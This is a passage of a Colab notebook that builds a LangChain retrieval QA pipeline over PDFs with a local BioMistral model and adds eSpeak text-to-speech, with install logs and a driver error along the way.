\u001b[0mexc_info\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;32mTrue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mKeyboardInterrupt\u001b[0m: Interrupted by user"
          ]
        }
      ],
      "source": [
        "\n",
        "import sys\n",
        "\n",
        "while True:\n",
        "  user_input = input(f\"Input Prompt: \")\n",
        "  if user_input == 'exit':\n",
        "    print('Exiting')\n",
        "    sys.exit()\n",
        "  if user_input == '':\n",
        "    continue\n",
        "  result = rag_chain.invoke(user_input)\n",
        "  print(\"Answer: \",result)"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install pyttsx3"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "S4AJCPG7Iebz",
        "outputId": "cd94c5d3-e5bf-4a69-ba15-430e3f946ce3"
      },
      "execution_count": 32,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pyttsx3\n",
            "  Downloading pyttsx3-2.97-py3-none-any.whl.metadata (3.8 kB)\n",
            "Downloading pyttsx3-2.97-py3-none-any.whl (34 kB)\n",
            "Installing collected packages: pyttsx3\n",
            "Successfully installed pyttsx3-2.97\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import pyttsx3\n",
        "import sys\n",
        "from langchain_core._api.deprecation import surface_langchain_deprecation_warnings\n",
        "\n",
        "# Initialize text-to-speech engine\n",
        "engine = pyttsx3.init()\n",
        "\n",
        "# Function to convert text to speech\n",
        "def speak(text):\n",
        "    engine.say(text)\n",
        "    engine.runAndWait()\n",
        "\n",
        "# Your existing code\n",
        "from langchain_community.document_loaders import PyPDFDirectoryLoader\n",
        "from langchain.text_splitter import CharacterTextSplitter, RecursiveCharacterTextSplitter\n",
        "from langchain_community.embeddings import HuggingFaceEmbeddings\n",
        "from langchain.vectorstores import FAISS, Chroma\n",
        "from langchain_community.llms import LlamaCpp\n",
        "from langchain.chains import RetrievalQA, LLMChain\n",
        "\n",
        "import pathlib\n",
        "import textwrap\n",
        "from IPython.display import display, Markdown\n",
        "\n",
        "def to_markdown(text):\n",
        "    text = text.replace('•', '  *')\n",
        "    return Markdown(textwrap.indent(text, '> ', predicate=lambda _: True))\n",
        "\n",
        "# Setup HuggingFace Access Token\n",
        "import os\n",
        "from getpass import getpass\n",
        "\n",
        "HUGGINGFACEHUB_API_TOKEN = os.getenv(\"HUGGINGFACEHUB_API_TOKEN\")\n",
        "os.environ[\"HUGGINGFACEHUB_API_TOKEN\"] = HUGGINGFACEHUB_API_TOKEN\n",
        "\n",
        "# Import document\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "\n",
        "loader = PyPDFDirectoryLoader(\"/content/drive/MyDrive/Pdf\")\n",
        "docs = loader.load()\n",
        "\n",
        "# Text Splitting - Chunking\n",
        "text_splitter = RecursiveCharacterTextSplitter(chunk_size=300, chunk_overlap=50)\n",
        "chunks = text_splitter.split_documents(docs)\n",
        "\n",
        "embeddings = HuggingFaceEmbeddings(model_name=\"BAAI/bge-base-en-v1.5\")\n",
        "\n",
        "# Vector Store - FAISS or ChromaDB\n",
        "vectorstore = Chroma.from_documents(chunks, embeddings)\n",
        "\n",
        "query = \"Result\"\n",
        "search = vectorstore.similarity_search(query)\n",
        "to_markdown(search[0].page_content)\n",
        "\n",
        "# Retriever\n",
        "retriever = vectorstore.as_retriever(search_kwargs={'k': 5})\n",
        "retriever.get_relevant_documents(query)\n",
        "\n",
        "# Large Language Model - Open Source\n",
        "llm = LlamaCpp(\n",
        "    model_path= \"/content/drive/MyDrive/Pdf/Bio/BioMistral-7B.Q4_K_M.gguf\",\n",
        "    temperature=0.3,\n",
        "    max_tokens=2048,\n",
        "    top_p=1\n",
        ")\n",
        "\n",
        "# RAG Chain\n",
        "from langchain.schema.runnable import RunnablePassthrough\n",
        "from langchain.schema.output_parser import StrOutputParser\n",
        "from langchain.prompts import ChatPromptTemplate\n",
        "\n",
        "template = \"\"\"\n",
        "<|context|>\n",
        "You are an AI assistant that follows instruction extremely well.\n",
        "Please be truthful and give direct answers\n",
        "</s>\n",
        "<|user|>\n",
        "{query}\n",
        "</s>\n",
        " <|assistant|>\n",
        "\"\"\"\n",
        "\n",
        "prompt = ChatPromptTemplate.from_template(template)\n",
        "rag_chain = (\n",
        "    {\"context\": retriever, \"query\": RunnablePassthrough()}\n",
        "    | prompt\n",
        "    | llm\n",
        "    | StrOutputParser()\n",
        ")\n",
        "\n",
        "# Interactive Loop\n",
        "while True:\n",
        "    user_input = input(f\"Input Prompt: \")\n",
        "    if user_input == 'exit':\n",
        "        print('Exiting')\n",
        "        speak('Exiting')\n",
        "        sys.exit()\n",
        "    if user_input == '':\n",
        "        continue\n",
        "    result = rag_chain.invoke(user_input)\n",
        "    print(\"Answer: \", result)\n",
        "    speak(result)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 408
        },
        "id": "qGVNjmphIXZ7",
        "outputId": "e99989b7-e1ac-41f5-c07b-eca0088ef828"
      },
      "execution_count": 33,
      "outputs": [
        {
          "output_type": "error",
          "ename": "RuntimeError",
          "evalue": "This means you probably do not have eSpeak or eSpeak-ng installed!",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pyttsx3/__init__.py\u001b[0m in \u001b[0;36minit\u001b[0;34m(driverName, debug)\u001b[0m\n\u001b[1;32m     19\u001b[0m     \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 20\u001b[0;31m         \u001b[0meng\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_activeEngines\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mdriverName\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     21\u001b[0m     \u001b[0;32mexcept\u001b[0m \u001b[0mKeyError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.10/weakref.py\u001b[0m in \u001b[0;36m__getitem__\u001b[0;34m(self, key)\u001b[0m\n\u001b[1;32m    136\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_commit_removals\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 137\u001b[0;31m         \u001b[0mo\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdata\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    138\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mo\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mKeyError\u001b[0m: None",
            "\nDuring handling of the above exception, another exception occurred:\n",
            "\u001b[0;31mRuntimeError\u001b[0m                              Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-33-e856bbc532b3>\u001b[0m in \u001b[0;36m<cell line: 6>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;31m# Initialize text-to-speech engine\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 6\u001b[0;31m \u001b[0mengine\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mpyttsx3\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0minit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      7\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      8\u001b[0m \u001b[0;31m# Function to convert text to speech\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pyttsx3/__init__.py\u001b[0m in \u001b[0;36minit\u001b[0;34m(driverName, debug)\u001b[0m\n\u001b[1;32m     20\u001b[0m         \u001b[0meng\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_activeEngines\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mdriverName\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     21\u001b[0m     \u001b[0;32mexcept\u001b[0m \u001b[0mKeyError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 22\u001b[0;31m         \u001b[0meng\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mEngine\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mdriverName\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdebug\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     23\u001b[0m         \u001b[0m_activeEngines\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mdriverName\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0meng\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     24\u001b[0m     \u001b[0;32mreturn\u001b[0m \u001b[0meng\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pyttsx3/engine.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, driverName, debug)\u001b[0m\n\u001b[1;32m     28\u001b[0m         \u001b[0;34m@\u001b[0m\u001b[0mtype\u001b[0m \u001b[0mdebug\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mbool\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     29\u001b[0m         \"\"\"\n\u001b[0;32m---> 30\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mproxy\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdriver\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mDriverProxy\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mweakref\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mproxy\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdriverName\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mdebug\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     31\u001b[0m         \u001b[0;31m# initialize other vars\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     32\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_connects\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m{\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pyttsx3/driver.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self, engine, driverName, debug)\u001b[0m\n\u001b[1;32m     48\u001b[0m         \u001b[0;31m# import driver module\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     49\u001b[0m         \u001b[0mname\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m'pyttsx3.drivers.%s'\u001b[0m \u001b[0;34m%\u001b[0m \u001b[0mdriverName\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 50\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_module\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mimportlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mimport_module\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mname\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     51\u001b[0m         \u001b[0;31m# build driver instance\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     52\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_driver\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_module\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mbuildDriver\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mweakref\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mproxy\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.10/importlib/__init__.py\u001b[0m in \u001b[0;36mimport_module\u001b[0;34m(name, package)\u001b[0m\n\u001b[1;32m    124\u001b[0m                 \u001b[0;32mbreak\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    125\u001b[0m             \u001b[0mlevel\u001b[0m \u001b[0;34m+=\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 126\u001b[0;31m     \u001b[0;32mreturn\u001b[0m \u001b[0m_bootstrap\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_gcd_import\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mname\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mlevel\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mpackage\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mlevel\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    127\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    128\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.10/importlib/_bootstrap.py\u001b[0m in \u001b[0;36m_gcd_import\u001b[0;34m(name, package, level)\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.10/importlib/_bootstrap.py\u001b[0m in \u001b[0;36m_find_and_load\u001b[0;34m(name, import_)\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.10/importlib/_bootstrap.py\u001b[0m in \u001b[0;36m_find_and_load_unlocked\u001b[0;34m(name, import_)\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.10/importlib/_bootstrap.py\u001b[0m in \u001b[0;36m_load_unlocked\u001b[0;34m(spec)\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.10/importlib/_bootstrap_external.py\u001b[0m in \u001b[0;36mexec_module\u001b[0;34m(self, module)\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.10/importlib/_bootstrap.py\u001b[0m in \u001b[0;36m_call_with_frames_removed\u001b[0;34m(f, *args, **kwds)\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pyttsx3/drivers/espeak.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     10\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     11\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0;34m.\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mvoice\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mVoice\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 12\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0;34m.\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0m_espeak\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mfromUtf8\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtoUtf8\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     13\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     14\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/pyttsx3/drivers/_espeak.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     46\u001b[0m \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     47\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0mload_library\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 48\u001b[0;31m         \u001b[0;32mraise\u001b[0m \u001b[0mRuntimeError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"This means you probably do not have eSpeak or eSpeak-ng installed!\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     49\u001b[0m \u001b[0;32mexcept\u001b[0m \u001b[0mException\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0mexp\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     50\u001b[0m     \u001b[0;32mraise\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mRuntimeError\u001b[0m: This means you probably do not have eSpeak or eSpeak-ng installed!"
          ]
        }
      ]
    },
    {
      "source": [
        "\n",
        "!sudo apt-get update\n",
        "!sudo apt-get install espeak"
      ],
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "k2MJcnS9Iqir",
        "outputId": "facb297d-545a-4930-d9a6-ceeda95d4efe"
      },
      "execution_count": 34,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\r0% [Working]\r            \rGet:1 https://cloud.r-project.org/bin/linux/ubuntu jammy-cran40/ InRelease [3,626 B]\n",
            "Hit:2 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64  InRelease\n",
            "Hit:3 http://archive.ubuntu.com/ubuntu jammy InRelease\n",
            "Get:4 http://security.ubuntu.com/ubuntu jammy-security InRelease [129 kB]\n",
            "Get:5 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [128 kB]\n",
            "Hit:6 https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu jammy InRelease\n",
            "Hit:7 https://ppa.launchpadcontent.net/graphics-drivers/ppa/ubuntu jammy InRelease\n",
            "Ign:8 https://r2u.stat.illinois.edu/ubuntu jammy InRelease\n",
            "Hit:9 https://ppa.launchpadcontent.net/ubuntugis/ppa/ubuntu jammy InRelease\n",
            "Get:10 https://r2u.stat.illinois.edu/ubuntu jammy Release [5,713 B]\n",
            "Hit:11 http://archive.ubuntu.com/ubuntu jammy-backports InRelease\n",
            "Get:12 https://r2u.stat.illinois.edu/ubuntu jammy Release.gpg [793 B]\n",
            "Get:13 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 Packages [1,440 kB]\n",
            "Get:14 http://security.ubuntu.com/ubuntu jammy-security/restricted amd64 Packages [3,097 kB]\n",
            "Get:15 http://archive.ubuntu.com/ubuntu jammy-updates/restricted amd64 Packages [3,181 kB]\n",
            "Get:16 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 Packages [2,585 kB]\n",
            "Get:17 http://security.ubuntu.com/ubuntu jammy-security/universe amd64 Packages [1,150 kB]\n",
            "Get:18 http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages [2,308 kB]\n",
            "Get:19 https://r2u.stat.illinois.edu/ubuntu jammy/main amd64 Packages [2,582 kB]\n",
            "Get:20 https://r2u.stat.illinois.edu/ubuntu jammy/main all Packages [8,326 kB]\n",
            "Fetched 24.9 MB in 11s (2,372 kB/s)\n",
            "Reading package lists... Done\n",
            "W: Skipping acquire of configured file 'main/source/Sources' as repository 'https://r2u.stat.illinois.edu/ubuntu jammy InRelease' does not seem to provide it (sources.list entry misspelt?)\n",
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "The following additional packages will be installed:\n",
            "  espeak-data libespeak1 libportaudio2 libsonic0\n",
            "The following NEW packages will be installed:\n",
            "  espeak espeak-data libespeak1 libportaudio2 libsonic0\n",
            "0 upgraded, 5 newly installed, 0 to remove and 65 not upgraded.\n",
            "Need to get 1,382 kB of archives.\n",
            "After this operation, 3,178 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libportaudio2 amd64 19.6.0-1.1 [65.3 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu jammy/main amd64 libsonic0 amd64 0.2.0-11build1 [10.3 kB]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu jammy/universe amd64 espeak-data amd64 1.48.15+dfsg-3 [1,085 kB]\n",
            "Get:4 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libespeak1 amd64 1.48.15+dfsg-3 [156 kB]\n",
            "Get:5 http://archive.ubuntu.com/ubuntu jammy/universe amd64 espeak amd64 1.48.15+dfsg-3 [64.2 kB]\n",
            "Fetched 1,382 kB in 2s (700 kB/s)\n",
            "debconf: unable to initialize frontend: Dialog\n",
            "debconf: (No usable dialog-like program is installed, so the dialog based frontend cannot be used. at /usr/share/perl5/Debconf/FrontEnd/Dialog.pm line 78, <> line 5.)\n",
            "debconf: falling back to frontend: Readline\n",
            "debconf: unable to initialize frontend: Readline\n",
            "debconf: (This frontend requires a controlling tty.)\n",
            "debconf: falling back to frontend: Teletype\n",
            "dpkg-preconfigure: unable to re-open stdin: \n",
            "Selecting previously unselected package libportaudio2:amd64.\n",
            "(Reading database ... 123599 files and directories currently installed.)\n",
            "Preparing to unpack .../libportaudio2_19.6.0-1.1_amd64.deb ...\n",
            "Unpacking libportaudio2:amd64 (19.6.0-1.1) ...\n",
            "Selecting previously unselected package libsonic0:amd64.\n",
            "Preparing to unpack .../libsonic0_0.2.0-11build1_amd64.deb ...\n",
            "Unpacking libsonic0:amd64 (0.2.0-11build1) ...\n",
            "Selecting previously unselected package espeak-data:amd64.\n",
            "Preparing to unpack .../espeak-data_1.48.15+dfsg-3_amd64.deb ...\n",
            "Unpacking espeak-data:amd64 (1.48.15+dfsg-3) ...\n",
            "Selecting previously unselected package libespeak1:amd64.\n",
            "Preparing to unpack .../libespeak1_1.48.15+dfsg-3_amd64.deb ...\n",
            "Unpacking libespeak1:amd64 (1.48.15+dfsg-3) ...\n",
            "Selecting previously unselected package espeak.\n",
            "Preparing to unpack .../espeak_1.48.15+dfsg-3_amd64.deb ...\n",
            "Unpacking espeak (1.48.15+dfsg-3) ...\n",
            "Setting up libportaudio2:amd64 (19.6.0-1.1) ...\n",
            "Setting up libsonic0:amd64 (0.2.0-11build1) ...\n",
            "Setting up espeak-data:amd64 (1.48.15+dfsg-3) ...\n",
            "Setting up libespeak1:amd64 (1.48.15+dfsg-3) ...\n",
            "Setting up espeak (1.48.15+dfsg-3) ...\n",
            "Processing triggers for man-db (2.10.2-1) ...\n",
            "Processing triggers for libc-bin (2.35-0ubuntu3.4) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_5.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbb.so.12 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_0.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_adapter_level_zero.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_loader.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_adapter_opencl.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc_proxy.so.2 is not a symbolic link\n",
            "\n"
          ]
        }
      ]
    },
    {
      "source": [
        "\n",
        "!sudo apt-get install libespeak1"
      ],
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "HLiPiRGMItGp",
        "outputId": "a334650b-dffa-4ede-b1e0-c86ef8c97367"
      },
      "execution_count": 35,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "libespeak1 is already the newest version (1.48.15+dfsg-3).\n",
            "libespeak1 set to manually installed.\n",
            "0 upgraded, 0 newly installed, 0 to remove and 65 not upgraded.\n"
          ]
        }
      ]
    },
    {
      "source": [
        "engine = pyttsx3.init(driverName='espeak')"
      ],
      "cell_type": "code",
      "metadata": {
        "id": "aZ3VBvt5Ite2"
      },
      "execution_count": 36,
      "outputs": []
    },
    {
      "source": [
        "import pyttsx3\n",
        "import sys\n",
        "from langchain_core._api.deprecation import surface_langchain_deprecation_warnings\n",
        "\n",
        "# Initialize text-to-speech engine, explicitly specifying the espeak driver\n",
        "engine = pyttsx3.init(driverName='espeak')\n",
        "\n",
        "# Function to convert text to speech\n",
        "def speak(text):\n",
        "    engine.say(text)\n",
        "    engine.runAndWait()\n",
        "\n",
        "# Your existing code\n",
        "from langchain_community.document_loaders import PyPDFDirectoryLoader\n",
        "from langchain.text_splitter import CharacterTextSplitter, RecursiveCharacterTextSplitter\n",
        "from langchain_community.embeddings import HuggingFaceEmbeddings\n",
        "from langchain.vectorstores import FAISS, Chroma\n",
        "from langchain_community.llms import LlamaCpp\n",
        "from langchain.chains import RetrievalQA, LLMChain\n",
        "\n",
        "import pathlib\n",
        "import textwrap\n",
        "from IPython.display import display, Markdown\n",
        "\n",
        "def to_markdown(text):\n",
        "    text = text.replace('•', '  *')\n",
        "    return Markdown(textwrap.indent(text, '> ', predicate=lambda _: True))\n",
        "\n",
        "# Setup HuggingFace Access Token\n",
        "import os\n",
        "from getpass import getpass\n",
        "\n",
        "HUGGINGFACEHUB_API_TOKEN = os.getenv(\"HUGGINGFACEHUB_API_TOKEN\")\n",
        "os.environ[\"HUGGINGFACEHUB_API_TOKEN\"] = HUGGINGFACEHUB_API_TOKEN\n",
        "\n",
        "# Import document\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "\n",
        "loader = PyPDFDirectoryLoader(\"/content/drive/MyDrive/Pdf\")\n",
        "docs = loader.load()\n",
        "\n",
        "# Text Splitting - Chunking\n",
        "text_splitter = RecursiveCharacterTextSplitter(chunk_size=300, chunk_overlap=50)\n",
        "chunks = text_splitter.split_documents(docs)\n",
        "\n",
        "embeddings = HuggingFaceEmbeddings(model_name=\"BAAI/bge-base-en-v1.5\")\n",
        "\n",
        "# Vector Store - FAISS or ChromaDB\n",
        "vectorstore = Chroma.from_documents(chunks, embeddings)\n",
        "\n",
        "query = \"Result\"\n",
        "search = vectorstore.similarity_search(query)\n",
        "to_markdown(search[0].page_content)\n",
        "\n",
        "# Retriever\n",
        "retriever = vectorstore.as_retriever(search_kwargs={'k': 5})\n",
        "retriever.get_relevant_documents(query)\n",
        "\n",
        "# Large Language Model - Open Source\n",
        "llm = LlamaCpp(\n",
        "    model_path= \"/content/drive/MyDrive/Pdf/Bio/BioMistral-7B.Q4_K_M.gguf\",\n",
        "    temperature=0.3,\n",
        "    max_tokens=2048,\n",
        "    top_p=1\n",
        ")\n",
        "\n",
        "# RAG Chain\n",
        "from langchain.schema.runnable import RunnablePassthrough\n",
